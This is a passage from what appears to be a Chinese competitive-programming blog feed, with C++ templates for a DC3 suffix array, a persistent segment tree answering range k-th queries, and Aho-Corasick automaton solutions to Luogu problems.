class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; m; i++) ws[i] += ws[i - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) b[--ws[wv[i]]] = a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dc3</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n, <span class="keyword">int</span> m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, *rn = r + n, *san = sa + n, ta = <span class="number">0</span>, tb = (n + <span class="number">1</span>) / <span class="number">3</span>, tbc = <span class="number">0</span>, p;</span><br><span class="line">    r[n] = r[n + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) <span class="keyword">if</span> (i % <span class="number">3</span> != <span class="number">0</span>) wa[tbc++] = i;</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">2</span>, wa, wb, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r + <span class="number">1</span>, wb, wa, tbc, m);</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wa, wb, tbc, m);</span><br><span class="line">    <span class="keyword">for</span> (p = <span class="number">1</span>, rn[<span class="built_in">F</span>(wb[<span class="number">0</span>])] = <span class="number">0</span>, i = <span class="number">1</span>; i &lt; tbc; i++)</span><br><span class="line">        rn[<span class="built_in">F</span>(wb[i])] = <span class="built_in">c0</span>(r, wb[i - <span class="number">1</span>], wb[i]) ? p - <span class="number">1</span> : p++;</span><br><span class="line">    <span class="keyword">if</span> (p &lt; tbc) <span class="built_in">dc3</span>(rn, san, tbc, p);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) san[rn[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) <span class="keyword">if</span> (san[i] &lt; tb) wb[ta++] = san[i] * <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) wb[ta++] = n - <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">Rsort</span>(r, wb, wa, ta, m);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tbc; i++) wv[wb[i] = <span class="built_in">G</span>(san[i])] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>, j = <span class="number">0</span>, p = <span class="number">0</span>; i &lt; ta &amp;&amp; j &lt; tbc; p++)</span><br><span class="line">        sa[p] = <span class="built_in">c12</span>(wb[j] % <span class="number">3</span>, r, wa[i], wb[j]) ? wa[i++] : wb[j++];</span><br><span class="line">    <span class="keyword">for</span> (; i &lt; ta; p++) sa[p] = wa[i++];</span><br><span class="line">    <span class="keyword">for</span> (; j &lt; tbc; p++) sa[p] = wb[j++];</span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) rak[i]=rak[i-1];</span></span><br><span class="line">    <span class="comment">//for(int i=n;i;i--) sa[i]++;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calheight</span><span class="params">(<span class="keyword">int</span> *r, <span class="keyword">int</span> *sa, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) rak[sa[i]] = i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; height[rak[i++]] = k)</span><br><span class="line">        <span class="keyword">for</span> (k ? k-- : <span class="number">0</span>, j = sa[rak[i] - <span class="number">1</span>]; r[i + k] == r[j + k]; k++);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) rak[i]=rak[i<span class="number">-1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n;i;i--) sa[i]++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s+<span class="number">1</span>)&amp;&amp;s[<span class="number">1</span>] != <span class="string">&#x27;#&#x27;</span>) &#123;</span><br><span class="line">        n = <span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">            cal[i] = s[i] - <span class="string">&#x27;a&#x27;</span> + <span class="number">1</span>;</span><br><span class="line">        cal[n+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">dc3</span>(cal+<span class="number">1</span>, sa, n + <span class="number">1</span>, <span class="number">30</span>);</span><br><span class="line">        <span class="built_in">calheight</span>(cal+<span class="number">1</span>, sa, n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,height[i]);</span><br><span class="line">        &#125;<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 字符串 </category>
          
          <category> SA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>主席树的学习</title>
      <link href="/2022/04/02/%E4%B8%BB%E5%B8%AD%E6%A0%91/"/>
      <url>/2022/04/02/%E4%B8%BB%E5%B8%AD%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>主席树应用之一：区间第k大，中间还有用到vector离散化</p><span id="more"></span><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">2e5</span>+<span class="number">10</span>;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;v;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r,sum;</span><br><span class="line">    <span class="comment">//l为一个离散化变量的左边界，r为右边界，都是对于值域而言的，sum存储数值在[l,r]区间内的数的个数 </span></span><br><span class="line">&#125;node;</span><br><span class="line">node tree[maxn*<span class="number">20</span>];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">getid</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">lower_bound</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>(),x)-v.<span class="built_in">begin</span>()+<span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">0</span>,po=<span class="number">1</span>;<span class="keyword">char</span> ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)&amp;&amp;ch!=<span class="string">&#x27;-&#x27;</span>) ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">if</span> (ch==<span class="string">&#x27;-&#x27;</span>) po=<span class="number">-1</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isdigit</span>(ch)) a=a*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>,ch=<span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> a*po; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> n,m,a[maxn],root[maxn],cnt;<span class="comment">//n,m如题意所示，a为原数组，cnt为已分配节点数量 </span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> pre,<span class="keyword">int</span> &amp;now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">    tree[++cnt]=tree[pre];</span><br><span class="line">    now=cnt;</span><br><span class="line">    tree[now].sum++;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(p&lt;=m)<span class="built_in">insert</span>(l,m,tree[pre].l,tree[now].l,p);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">insert</span>(m+<span class="number">1</span>,r,tree[pre].r,tree[now].r,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> start,<span class="keyword">int</span> end,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)<span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">int</span> m=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tmp=tree[tree[end].l].sum-tree[tree[start].l].sum;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=tmp)<span class="keyword">return</span> <span class="built_in">query</span>(l,m,tree[start].l,tree[end].l,k);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">query</span>(m+<span class="number">1</span>,r,tree[start].r,tree[end].r,k-tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">     n=<span class="built_in">read</span>(),m=<span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        v.<span class="built_in">push_back</span>(a[i]=<span class="built_in">read</span>());</span><br><span class="line">    <span class="built_in">sort</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>());</span><br><span class="line">    v.<span class="built_in">erase</span>(<span class="built_in">unique</span>(v.<span class="built_in">begin</span>(),v.<span class="built_in">end</span>()),v.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">insert</span>(<span class="number">1</span>,v.<span class="built_in">size</span>(),root[i<span class="number">-1</span>],root[i],<span class="built_in">getid</span>(a[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> l,r,k;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        l=<span class="built_in">read</span>(),r=<span class="built_in">read</span>(),k=<span class="built_in">read</span>();</span><br><span class="line">        cout&lt;&lt;v[<span class="built_in">query</span>(<span class="number">1</span>,v.<span class="built_in">size</span>(),root[l<span class="number">-1</span>],root[r],k)<span class="number">-1</span>]&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数据结构 </category>
          
          <category> 主席树 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AC自动机的学习</title>
      <link href="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>洛谷的板子</p><span id="more"></span><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1000001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">bool</span> b[maxn];</span><br><span class="line">string word,s;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    A *fail;</span><br><span class="line">    A *next[<span class="number">26</span>];</span><br><span class="line">    <span class="keyword">int</span> word;</span><br><span class="line">    <span class="keyword">int</span> num;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            next[i]=<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fail=<span class="literal">NULL</span>; </span><br><span class="line">        word=<span class="number">0</span>;</span><br><span class="line">        num=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node *root;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert_word</span><span class="params">(<span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=word.<span class="built_in">length</span>();</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=word[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next[k]==<span class="literal">NULL</span>)&#123;</span><br><span class="line">            node *temp;</span><br><span class="line">            temp=<span class="keyword">new</span> node;</span><br><span class="line">            temp-&gt;<span class="built_in">a</span>();</span><br><span class="line">            p-&gt;next[k]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next[k];    </span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;word=j;</span><br><span class="line">    p-&gt;num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fail</span><span class="params">()</span></span>&#123;</span><br><span class="line">    queue&lt;node *&gt;q;</span><br><span class="line">    q.<span class="built_in">push</span>(root);</span><br><span class="line">    <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        node *p=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                node *t=p-&gt;next[i];</span><br><span class="line">                <span class="keyword">if</span>(p==root)&#123;</span><br><span class="line">                    t-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    node *fafail=p-&gt;fail;</span><br><span class="line">                    <span class="keyword">while</span>(fafail!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(fafail-&gt;next[i]!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">                            t-&gt;fail=fafail-&gt;next[i];</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        fafail=fafail-&gt;fail;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(fafail==<span class="literal">NULL</span>)t-&gt;fail=root;</span><br><span class="line">                &#125;</span><br><span class="line">                q.<span class="built_in">push</span>(t);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line">    node *p=root;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> k=s[i]-<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(p!=root&amp;&amp;p-&gt;next[k]==<span class="literal">NULL</span>)</span><br><span class="line">            p=p-&gt;fail;</span><br><span class="line">        p=p-&gt;next[k];</span><br><span class="line">        <span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">            p=root;</span><br><span class="line">        node *temp=p;</span><br><span class="line">        <span class="comment">//while(temp!=root)&#123;</span></span><br><span class="line">            <span class="keyword">if</span>(temp-&gt;word&amp;&amp;!b[temp-&gt;word])&#123;</span><br><span class="line">                b[temp-&gt;word]=<span class="number">1</span>;</span><br><span class="line">                ans+=temp-&gt;num;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="comment">//    temp=temp-&gt;fail;</span></span><br><span class="line">        <span class="comment">//&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int c[10001];</span></span><br><span class="line"><span class="comment">int all=0;</span></span><br><span class="line"><span class="comment">void print()&#123;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;=all;i++)&#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%c&quot;,b[i]+&#x27;a&#x27;);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">void dfs(node *t)&#123;</span></span><br><span class="line"><span class="comment">    if(t-&gt;word)print();</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;26;i++)&#123;</span></span><br><span class="line"><span class="comment">        if(t-&gt;next[i]!=NULL)&#123;</span></span><br><span class="line"><span class="comment">            c[++all]=i;</span></span><br><span class="line"><span class="comment">            dfs(t-&gt;next[i]);</span></span><br><span class="line"><span class="comment">            all--;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;P3808.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="comment">//freopen(&quot;P3808.out&quot;,&quot;w&quot;,stdout);</span></span><br><span class="line">    root=<span class="keyword">new</span> node;</span><br><span class="line">    root-&gt;<span class="built_in">a</span>();</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;word;</span><br><span class="line">        <span class="built_in">insert_word</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//dfs(root);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fail</span>();</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;s)&#123;</span><br><span class="line">        ans=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">query</span>();</span><br><span class="line">        cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><p><img src="/2022/04/02/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> word;</span><br><span class="line">    A* fail;</span><br><span class="line">    A* next[<span class="number">26</span>];</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        word=<span class="number">0</span>;</span><br><span class="line">        fail=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">            next[i]=<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;node;</span><br><span class="line">node *root;</span><br><span class="line">queue&lt;node*&gt;q;</span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt;tmap;</span><br><span class="line">string word[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">char</span> t[<span 